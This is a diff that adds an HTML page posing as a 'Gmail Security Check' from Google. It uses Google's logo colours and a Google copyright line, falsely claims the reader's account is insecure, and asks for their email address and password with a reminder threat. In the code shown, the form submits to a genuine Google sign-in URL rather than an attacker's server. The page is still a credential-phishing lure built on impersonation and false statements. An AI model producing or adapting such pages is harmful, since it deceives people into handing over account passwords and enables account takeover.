@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Gmail Security Check</title>
+    <style>
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        .logo-text {
+            font-size: 30px;
+            font-weight: bold;
+            font-family: Arial, sans-serif;
+        }
+        .g { color: #4285F4; } /* Blue */
+        .o1 { color: #DB4437; } /* Red */
+        .o2 { color: #F4B400; } /* Yellow */
+        .g2 { color: #4285F4; } /* Blue */
+        .l { color: #0F9D58; } /* Green */
+        .e { color: #DB4437; } /* Red */
+        .form-container {
+            max-width: 400px;
+            margin: 20px 0;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        input[type="submit"] {
+            background-color: #4285F4;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>Gmail Security Check</h1>
+        <div class="logo-text">
+            <span class="g">G</span>
+            <span class="o1">o</span>
+            <span class="o2">o</span>
+            <span class="g2">g</span>
+            <span class="l">l</span>
+            <span class="e">e</span>
+        </div>
+    </div>
+    <p>We have detected that your Gmail account does not have the necessary security features enabled. Please enter your login credentials below to help us secure your account.</p>
+    <p><strong>Note:</strong> If you fail to complete the security check, we will send you a reminder within 24 hours via email.</p>
+    <div class="form-container">
+        <form action="https://accounts.google.com/signin/v2/identifier" method="get">
+            <input type="text" name="username" placeholder="Email ID" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <input type="submit" value="Log in">
+        </form>
+    </div>
+    <p>You will receive an updated email at your Gmail ID within 5 minutes after completing the security check.</p>
+    <p>If you do not wish to receive emails to help you set up your device with Google when you sign in to your account on the device for the first time, please unsubscribe.</p>
+    <p>© 2025 Google LLC, 1600 Amphitheatre Parkway, Mountain View, CA 94043</p>
+    <p><strong>Regards,<br>Google</strong></p>
+</body>
+</html>
